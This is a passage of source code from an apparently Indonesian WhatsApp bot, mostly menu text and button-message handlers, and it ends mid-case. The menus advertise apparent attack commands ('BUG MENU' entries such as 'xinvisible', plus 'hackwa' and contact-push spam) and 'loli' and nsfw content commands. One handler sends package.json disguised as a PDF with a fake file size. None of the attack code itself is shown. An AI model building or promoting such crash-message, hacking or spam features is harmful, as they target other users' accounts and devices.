┏═━ [\`ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɢɪʀʟ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋᴋᴀʏᴇs
║➜ ${prefix}ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɢʜᴇᴀ  
║➜ ${prefix}ᴛɪᴋᴛᴏᴋsᴀɴᴛᴜʏ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ  
║➜ ${prefix}ᴜʟᴢᴢᴀɴɢɢɪʀʟ  
║➜ ${prefix}ᴜʟᴢᴢᴀɴɢʙᴏʏ
║➜ ${prefix}ʀʏᴜᴊɪɴ
║➜ ${prefix}ʀᴏsᴇ
║➜ ${prefix}ᴘᴜʙɢ
║➜ ${prefix}ᴘʀᴏғɪʟᴇᴘɪᴄ
║➜ ${prefix}ᴘᴘᴄᴘ
║➜ ${prefix}ᴄᴀʀ  
║➜ ${prefix}ɴᴏᴛɴᴏᴛ
║➜ ${prefix}ᴋᴘᴏᴘ  
║➜ ${prefix}ᴋᴀʏᴇs  
║➜ ${prefix}ᴊᴜsᴛɪɴᴀ
║➜ ${prefix}ᴅᴏɢɢᴏ
║➜ ${prefix}ᴄᴀᴛ
║➜ ${prefix}ʙᴏɴᴇᴋᴀ
║➜ ${prefix}ʙɪᴋᴇ
║➜ ${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ
║➜ ${prefix}ᴀɴᴛɪᴡᴏʀᴋ  
║➜ ${prefix}ᴀᴇsᴛʜᴇᴛɪᴄ
║➜ ${prefix}ᴠɪᴇᴛɴᴀᴍᴇsᴇ  
║➜ ${prefix}ᴛʜᴀɪ  
║➜ ${prefix}ʀᴀɴᴅᴏᴍʙᴏʏ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɢɪʀʟ
║➜ ${prefix}ᴍᴀʟᴀʏ
║➜ ${prefix}ᴋᴏʀᴇᴀɴ
║➜ ${prefix}ɪɴᴅᴏ
║➜ ${prefix}ᴊᴀᴘᴀɴᴇsᴇ
║➜ ${prefix}ʜɪᴊᴀʙ  
║➜ ${prefix}ᴄʜɪɴᴇsᴇ
┗━━━━━━━⭑  
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
   headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
    case "allmenu": {
    let menu = `* ${pushname}.*  ᴏᴡɴᴇʀ ɴᴀᴍᴇ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, 






┏═━ [\`ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ\`] ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ [\`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\`] ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴄᴏᴍᴍᴀɴᴅ ʙᴏᴛ\`] ━━
║◦ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ғɪᴛᴜʀ ʙᴏᴛ: \`.ᴀʟʟᴍᴇɴᴜ\`
║◦ ʙᴇʀᴀʟɪʜ ᴋᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴ : \`.ᴍᴇɴᴜ1\`
┗━━━━━━━━━━━━
┏═━ [\`ᴏᴡɴᴇʀ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴄʀᴇᴀᴛᴇsᴄ
║➜ ${prefix}sᴇᴛᴛʜᴜᴍʙ
║➜ ${prefix}ᴍᴏᴅᴇ  
║➜ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
║➜ ${prefix}ᴅᴇʟᴘʀᴇᴍ
║➜ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
║➜ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
║➜ ${prefix}ᴜᴘᴄʜ
║➜ ${prefix}ʜᴀᴄᴋᴡᴀ
║➜ ${prefix}ᴜᴘsᴡ
┗━━━━━━━⭑
┏━━━ ❖ ʙᴜɢ ᴍᴇɴᴜ ❖ ━━
║➜ ${prefix} imperceptible
║➜ ${prefix} xɢʜsᴏᴛ
║➜ ${prefix} xɪɴᴠɪsɪʙʟᴇ
║➜ ${prefix} ᴀᴅᴅᴄᴀsᴇ
║➜ ${prefix} ᴇɴᴄ
┗━━━━━━━⭑ 
┏═━ [\`ᴀɴɪᴍᴇ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴀᴋɪʀᴀ
║➜ ${prefix}ᴀᴋɪʏᴀᴍᴀ
║➜ ${prefix}ᴀɴᴀ
║➜ ${prefix}ᴀsᴜɴᴀ
║➜ ${prefix}ᴀʏᴜᴢᴀᴡᴀ
║➜ ${prefix}ʙᴏʀᴜᴛᴏ
║➜ ${prefix}ᴄʜɪʜᴏ
║➜ ${prefix}ᴄʜɪᴛᴏɢᴇ
║➜ ${prefix}ᴄᴏsᴘʟᴀʏʟᴏʟɪ
║➜ ${prefix}ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
║➜ ${prefix}ᴅᴇɪᴅᴀʀᴀ
║➜ ${prefix}ᴅᴏʀᴀᴇᴍᴏɴ
║➜ ${prefix}ᴇʟᴀɪɴᴀ
║➜ ${prefix}ᴇᴍɪʟɪᴀ
║➜ ${prefix}ᴇʀᴢᴀ
║➜ ${prefix}ɢʀᴇᴍᴏʀʏ
║➜ ${prefix}ʜᴇsᴛɪᴀ
║➜ ${prefix}ʜɪɴᴀᴛᴀ
║➜ ${prefix}ʜᴜsʙᴜ
║➜ ${prefix}ɪɴᴏʀɪ
║➜ ${prefix}ɪsᴜᴢᴜ
║➜ ${prefix}ɪᴛᴀᴄʜɪ
║➜ ${prefix}ɪᴛᴏʀɪ
║➜ ${prefix}ᴋᴀɢᴀ
║➜ ${prefix}ᴋᴀɢᴜʀᴀ
║➜ ${prefix}ᴋᴀᴋᴀsɪʜ
║➜ ${prefix}ᴋᴀᴏʀɪ
║➜ ${prefix}ᴋᴇɴᴇᴋɪ
║➜ ${prefix}ᴋᴏᴛᴏʀɪ
║➜ ${prefix}ᴋᴜʀᴜᴍɪ
║➜ ${prefix}ʟᴏʟɪ
║➜ ${prefix}ᴍᴀᴅᴀʀᴀ
║➜ ${prefix}ᴍᴇɢᴜᴍɪɴ
║➜ ${prefix}ᴍɪᴋᴀsᴀ
║➜ ${prefix}ᴍɪᴋᴇʏ
║➜ ${prefix}ᴍɪᴋᴜ
║➜ ${prefix}ᴍɪɴᴀᴛᴏ
║➜ ${prefix}ɴᴀʀᴜᴛᴏ
║➜ ${prefix}ɴᴇᴋᴏ
║➜ ${prefix}ɴᴇᴋᴏ2
║➜ ${prefix}ɴᴇᴋᴏɴɪᴍᴇ
║➜ ${prefix}ɴᴇᴢᴜᴋᴏ
║➜ ${prefix}ᴏɴᴇᴘɪᴇᴄᴇ
║➜ ${prefix}ᴘᴏᴋᴇᴍᴏɴ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɴɪᴍᴇ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
║➜ ${prefix}ʀɪᴢᴇ
║➜ ${prefix}sᴀɢɪʀɪ
║➜ ${prefix}sᴀᴋᴜʀᴀ
║➜ ${prefix}sᴀsᴜᴋᴇ
║➜ ${prefix}sʜɪɴᴀ
║➜ ${prefix}sʜɪɴᴋᴀ
║➜ ${prefix}sʜɪɴᴏᴍɪʏᴀ
║➜ ${prefix}sʜɪᴢᴜᴋᴀ
║➜ ${prefix}sʜᴏᴛᴀ
║➜ ${prefix}ᴛᴇᴊɪɴᴀ
║➜ ${prefix}ᴛᴏᴜᴋᴀᴄʜᴀɴ
║➜ ${prefix}ᴛsᴜɴᴀᴅᴇ
║➜ ${prefix}ᴡᴀɪғᴜ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀʟʟ
║➜ ${prefix}ʏᴏᴛsᴜʙᴀ
║➜ ${prefix}ʏᴜᴋɪ
║➜ ${prefix}ʏᴜʟɪʙᴏᴄɪʟ
║➜ ${prefix}ʏᴜᴍᴇᴋᴏ
║➜ ${prefix}8ʙᴀʟʟ
║➜ ${prefix}ᴛɪᴄᴋʟᴇ
║➜ ${prefix}ɢᴇᴄɢ
║➜ ${prefix}ғᴇᴇᴅ
║➜ ${prefix}ᴀɴɪᴍᴇᴀᴡᴏᴏ
║➜ ${prefix}ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ
║➜ ${prefix}ᴀɴɪᴍᴇsʜɪɴᴏʙᴜ
║➜ ${prefix}ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ
║➜ ${prefix}ᴀɴɪᴍᴇʜɪɢʜғɪᴠᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴄʀɪɴɢᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴅᴀɴᴄᴇ
║➜ ${prefix}ᴀɴɪᴍᴇʜᴀᴘᴘʏ
║➜ ${prefix}ᴀɴɪᴍᴇɢʟᴏᴍᴘ
║➜ ${prefix}ᴀɴɪᴍᴇʙʟᴜsʜ
║➜ ${prefix}ᴀɴɪᴍᴇsᴍᴜɢ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀᴠᴇ
║➜ ${prefix}ᴀɴɪᴍᴇsᴍɪʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴘᴏᴋᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴡɪɴᴋ
║➜ ${prefix}ᴀɴɪᴍᴇʙᴏɴᴋ
║➜ ${prefix}ᴀɴɪᴍᴇʙᴜʟʟʏ
║➜ ${prefix}ᴀɴɪᴍᴇʏᴇᴇᴛ
║➜ ${prefix}ᴀɴɪᴍᴇʙɪᴛᴇ
║➜ ${prefix}ᴀɴɪᴍᴇʟɪᴄᴋ
║➜ ${prefix}ᴀɴɪᴍᴇᴋɪʟʟ
║➜ ${prefix}ᴀɴɪᴍᴇᴄʀʏ
║➜ ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
║➜ ${prefix}ᴀɴɪᴍᴇᴋɪss
║➜ ${prefix}ᴀɴɪᴍᴇʜᴜɢ
║➜ ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
║➜ ${prefix}ᴀɴɪᴍᴇᴘᴀᴛ
║➜ ${prefix}ᴀɴɪᴍᴇsʟᴀᴘ
║➜ ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇᴡᴀɪғᴜ
║➜ ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
║➜ ${prefix}ᴀɴɪᴍᴇғᴏxɢɪʀʟ
║➜ ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢ
║➜ ${prefix}ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ
║➜ ${prefix}ᴀɴɪᴍᴇғᴇᴇᴅ
║➜ ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ
║➜ ${prefix}ɢᴇɴsʜɪɴ
║➜ ${prefix}ᴀɴɪᴍᴇ
║➜ ${prefix}ᴀᴍᴠ
┗━━━━━━━⭑
┏═━ [\`ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴅᴏᴡɴʟᴏᴀᴅ  
║➜ ${prefix}ᴛɪᴋᴛᴏᴋ  
║➜ ${prefix}ɪɢᴅʟ  
║➜ ${prefix}ᴘʟᴀʏ
║➜ ${prefix}ᴘʟᴀʏ2
║➜ ${prefix}ғᴀᴄᴇʙᴏᴏᴋ  
║➜ ${prefix}ᴠɪᴅᴇʏ  
║➜ ${prefix}sɴᴀᴄᴋᴠɪᴅᴇᴏ  
┗━━━━━━━⭑
┏═━ [\`ɢʀᴏᴜᴘ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴡᴇʟᴄᴏᴍᴇ  
║➜ ${prefix}ᴛᴀɢᴀʟʟ  
║➜ ${prefix}ʜɪᴅᴇᴛᴀɢ  
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋ
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋ2  
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋᴀʟʟ  
║➜ ${prefix}ɪɴᴠɪᴛᴇ  
║➜ ${prefix}ᴋɪᴄᴋ  
║➜ ${prefix}ᴅᴇʟᴇᴛᴇᴘᴘɢᴄ  
║➜ ${prefix}ᴅᴇʟᴘᴘɢᴄ  
║➜ ${prefix}ᴅᴇʟᴇᴛᴇᴘᴘɢʀᴏᴜᴘ  
║➜ ${prefix}sᴇᴛɢʀᴏᴜᴘᴘᴘ  
║➜ ${prefix}sᴇᴛɢᴄᴘᴘ  
║➜ ${prefix}sᴇᴛᴘᴘɢʀᴏᴜᴘ  
║➜ ${prefix}ɢᴇᴛᴘᴘ  
║➜ ${prefix}sᴇᴛᴅᴇsᴋ  
║➜ ${prefix}sᴇᴛᴅᴇsᴄ  
║➜ ${prefix}sᴇᴛsᴜʙᴊᴇᴄᴛ  
║➜ ${prefix}sᴇᴛɢʀᴏᴜᴘɴᴀᴍᴇ  
║➜ ${prefix}sᴇᴛɴᴀᴍᴇɢᴄ  
║➜ ${prefix}ᴘʀᴏᴍᴏᴛᴇ  
║➜ ${prefix}ᴅᴇᴍᴏᴛᴇ  
┗━━━━━━━⭑
┏═━ [\`ᴠᴏɪᴄᴇ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ғᴀsᴛ  
║➜ ${prefix}ᴛᴜᴘᴀɪ  
║➜ ${prefix}ʙʟᴏᴡɴ  
║➜ ${prefix}ʙᴀss  
║➜ ${prefix}sᴍᴏᴏᴛʜ  
║➜ ${prefix}ᴅᴇᴇᴘ  
║➜ ${prefix}ᴇᴀʀʀᴀᴘᴇ  
║➜ ${prefix}ɴɪɢʜᴛᴄᴏʀᴇ  
║➜ ${prefix}ғᴀᴛ  
║➜ ${prefix}ʀᴏʙᴏᴛ  
║➜ ${prefix}sʟᴏᴡ  
║➜ ${prefix}ʀᴇᴠᴇʀsᴇ  
┗━━━━━━━⭑
┏═━ [\`ᴏᴛʜᴇʀ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}sᴍᴇᴍᴇ  
║➜ ${prefix}ʟʏʀɪᴄ
║➜ ${prefix}ᴀɪᴄʟᴀᴜᴅᴇ  
║➜ ${prefix}ᴋᴇɴᴏɴ
║➜ ${prefix}ʀᴇᴍᴏᴠᴇʙɢ
║➜ ${prefix}ʜᴅ
║➜ ${prefix}ᴛᴏᴀɴɪᴍᴇ
║➜ ${prefix}ʜᴅ1
║➜ ${prefix}sᴜᴘᴇʀʜᴅ
║➜ ${prefix}ʀᴇᴍɪɴɪ
║➜ ${prefix}ʙᴜʏsᴄ
║➜ ${prefix}ᴘᴀʏᴍᴇɴᴛ
║➜ ${prefix}ʟɪsᴛᴘᴀɴᴇʟ
║➜ ${prefix}ʟɪsᴛᴠᴘs
┗━━━━━━━⭑
┏═━ [\`ғᴜɴ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ʀᴠᴏ
║➜ ${prefix}ᴀɴɪᴍᴇ
║➜ ${prefix}ǫᴜᴏᴛᴇs
║➜ ${prefix}ɴsғᴡ 
║➜ ${prefix}ᴛᴏᴜʀʟ 
║➜ ${prefix}ᴛᴏᴜʀʟ𝟷
║➜ ${prefix}ᴛᴏᴜʀʟ𝟸
║➜ ${prefix}ᴛᴏᴜʀʟ𝟹
║➜ ${prefix}ᴀʀᴛɪᴏᴡɴᴇʀ ɴᴀᴍᴇ
║➜ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
║➜ ${prefix}sɪғᴀᴛ
║➜ ${prefix}ǫᴄ
║➜ ${prefix}sᴛɪᴄᴋᴇʀ
║➜ ${prefix}ʙʀᴀᴛ
║➜ ${prefix}ʜᴀᴄᴋᴡᴀ
║➜ ${prefix}ᴀᴋsᴀʀᴀsᴜɴᴅᴀ  
║➜ ${prefix}ᴡᴀɪғᴜ  
║➜ ${prefix}ᴄᴏsᴘʟᴀʏ  
║➜ ${prefix}ɢʟɪᴛᴄʜᴛᴇxᴛ
║➜ ${prefix}ғɪɴᴅsᴏɴɢ  
║➜ ${prefix}sspotify  
║➜ ${prefix}ʀᴀɴᴅᴏᴍsғᴡ  
║➜ ${prefix}ᴍᴇᴍᴇ  
║➜ ${prefix}ʀᴀᴍᴀʟᴀɴ
║➜ ${prefix}ʟᴜᴄᴋʏɴᴜᴍʙᴇʀ
║➜ ${prefix}ᴛɪᴍᴇ  
║➜ ${prefix}ᴜᴘᴄʜ
║➜ ${prefix}ᴜᴘsᴡ
║➜ ${prefix}ʀᴏʙʟᴏxsᴛᴀʟᴋ
┗━━━━━━━⭑
┏═━ [\`ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɢɪʀʟ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋᴋᴀʏᴇs
║➜ ${prefix}ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋɢʜᴇᴀ  
║➜ ${prefix}ᴛɪᴋᴛᴏᴋsᴀɴᴛᴜʏ
║➜ ${prefix}ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ  
║➜ ${prefix}ᴜʟᴢᴢᴀɴɢɢɪʀʟ  
║➜ ${prefix}ᴜʟᴢᴢᴀɴɢʙᴏʏ
║➜ ${prefix}ʀʏᴜᴊɪɴ
║➜ ${prefix}ʀᴏsᴇ
║➜ ${prefix}ᴘᴜʙɢ
║➜ ${prefix}ᴘʀᴏғɪʟᴇᴘɪᴄ
║➜ ${prefix}ᴘᴘᴄᴘ
║➜ ${prefix}ᴄᴀʀ  
║➜ ${prefix}ɴᴏᴛɴᴏᴛ
║➜ ${prefix}ᴋᴘᴏᴘ  
║➜ ${prefix}ᴋᴀʏᴇs  
║➜ ${prefix}ᴊᴜsᴛɪɴᴀ
║➜ ${prefix}ᴅᴏɢɢᴏ
║➜ ${prefix}ᴄᴀᴛ
║➜ ${prefix}ʙᴏɴᴇᴋᴀ
║➜ ${prefix}ʙɪᴋᴇ
║➜ ${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ
║➜ ${prefix}ᴀɴᴛɪᴡᴏʀᴋ  
║➜ ${prefix}ᴀᴇsᴛʜᴇᴛɪᴄ
║➜ ${prefix}ᴠɪᴇᴛɴᴀᴍᴇsᴇ  
║➜ ${prefix}ᴛʜᴀɪ  
║➜ ${prefix}ʀᴀɴᴅᴏᴍʙᴏʏ
║➜ ${prefix}ʀᴀɴᴅᴏᴍɢɪʀʟ
║➜ ${prefix}ᴍᴀʟᴀʏ
║➜ ${prefix}ᴋᴏʀᴇᴀɴ
║➜ ${prefix}ɪɴᴅᴏ
║➜ ${prefix}ᴊᴀᴘᴀɴᴇsᴇ
║➜ ${prefix}ʜɪᴊᴀʙ  
║➜ ${prefix}ᴄʜɪɴᴇsᴇ
┗━━━━━━━⭑  
┏═━ [\`ᴘᴜsʜ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴄᴇᴋɪᴅᴄʜ
║➜ ${prefix}ᴄᴇᴋɪᴅɢᴄ
║➜ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ
║➜ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋɪᴅ
║➜ ${prefix}ᴅᴏɴᴇ
║➜ ${prefix}ᴄsᴇsɪ  
║➜ ${prefix}ᴀᴅᴅᴄᴀsᴇ
║➜ ${prefix}ᴜᴘsᴡ  
║➜ ${prefix}ᴘᴜʙʟɪᴄ  
║➜ ${prefix}sᴇʟғ  
┗━━━━━━━⭑  
━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ mm\`
`
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
case 'payment': {
let pay = `𝙃𝙞 @${pushname} 𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘽𝙚𝙗𝙚𝙧𝙖𝙥𝙖 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙆𝙖𝙢𝙞`
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Payment',
          sections: [
            {
              title: 'List Payment',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'QRIS',
                  id: '.qris'
                },
                {
                  title: 'DANA',
                  id: '.dana'
                },                
                {
                  title: 'OVO',
                  id: '.ovo'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: namafile,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: pay,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: namach,
   },   
    externalAdReply: {
      title: namaBot,
      body: namafile,
      thumbnailUrl: thumbnail,
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  },
})
}
break
case 'thanksto':
case 'tqto': {
    let apip = `

`
await Denzy.sendMessage(m.chat, {
      image: { url: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg' },
      gifPlayback: true,
      caption: apip,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true,
      title: namaBot,
      body: namaowner,
      thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
      sourceUrl: yt,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
      Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
}
          break
          case "setthumb":{
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!/image/.test(mime)) return reply("dengan kirim/reply foto")
await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let media = await Denzy.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Denzy.png');
let teks = directLink.toString()
 const newteks = m.quoted ? m.quoted.text : teks;

 if (newteks) {
 global.thumbnail = newteks;
 return Denzy.sendMessage(m.chat, { text: "_Berhasil Mengganti Thumbnail ✅_" });
 } else {
 return Reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break
case 'listpanel': {
    let lspnl = `
 `
await Denzy.sendMessage(m.key.remoteJid, {
        image: { url: global.thumbnail },
        caption: lspnl,
        footer: namafile,
        buttons: [
            {
                buttonId: '.owner',
                buttonText: {
                    displayText: 'CLICK HERE TO CHAT OWNER'
                },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: qkontak });
}
break
case 'listpanelpriv': {
    let lspnl = ` `
await Denzy.sendMessage(m.key.remoteJid, {
        image: { url: global.thumbnail },
        caption: lspnl,
        footer: namafile,
        buttons: [
            {
                buttonId: '.owner',
                buttonText: {
                    displayText: 'CLICK HERE TO CHAT OWNER'
                },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: qkontak });
}
break
case 'listvps': {
    let vps = `
all produk?👇
https://lynk.id/rizaldev `
await Denzy.sendMessage(m.key.remoteJid, {
        image: { url: global.thumbnail },
        caption: vps,
        footer: namafile,
        buttons: [
            {
                buttonId: '.owner',
                buttonText: {
                    displayText: 'CLICK HERE TO CHAT OWNER'
                },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: qkontak });
}
break
case 'mode': {
let mode = `𝘽𝙤𝙩 𝙉𝙮𝙖 𝙈𝙖𝙪 𝘿𝙞 𝙈𝙤𝙙𝙚 𝘼𝙥𝙖 𝙉𝙞𝙝 𝙆𝙞𝙣𝙜`
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
